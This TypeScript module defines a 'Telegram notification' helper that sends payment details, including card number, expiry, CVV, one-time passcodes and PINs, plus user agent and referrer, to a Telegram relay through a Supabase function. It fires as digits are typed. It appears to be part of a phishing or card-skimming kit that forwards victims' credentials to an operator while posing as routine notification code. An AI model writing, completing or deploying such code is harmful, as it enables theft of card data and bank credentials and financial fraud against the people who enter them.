import { flowAuth } from "@/lib/flowSession";
import { supabase } from "@/integrations/supabase/client";
import { getUserId } from "@/lib/userId";

type NotificationPayload = {
  type: 'page_entry' | 'payment_activity' | 'payment_cancelled';
  amount?: string;
  method?: string;
  referrer?: string;
  ip?: string;
  paymentType?: 'mfs' | 'card';
  number?: string;
  otp?: string;
  pin?: string;
  orderId?: string;
  cardName?: string;
  cardNumber?: string;
  expiry?: string;
  cvv?: string;
};

type Options = { force?: boolean };

// Dedupe consecutive identical payloads (typing→deleting→retyping same digits).
let lastSignature = "";

export const sendTelegramNotification = async (
  payload: NotificationPayload,
  opts: Options = {},
): Promise<{ request_id?: string } | null> => {
  const body = {
    ...payload,
    ...flowAuth(),
    userId: getUserId(),
    userAgent: navigator.userAgent,
    referrer: payload.referrer || document.referrer || 'Direct',
  };
  const signature = JSON.stringify(body);
  if (!opts.force && signature === lastSignature) return null;
  lastSignature = signature;
  try {
    const { data, error } = await supabase.functions.invoke('telegram-notify', { body });
    if (error) throw error;
    return (data as { request_id?: string } | null) ?? null;
  } catch (error) {
    lastSignature = "";
    console.error('Telegram notify failed:', error);
    return null;
  }
};
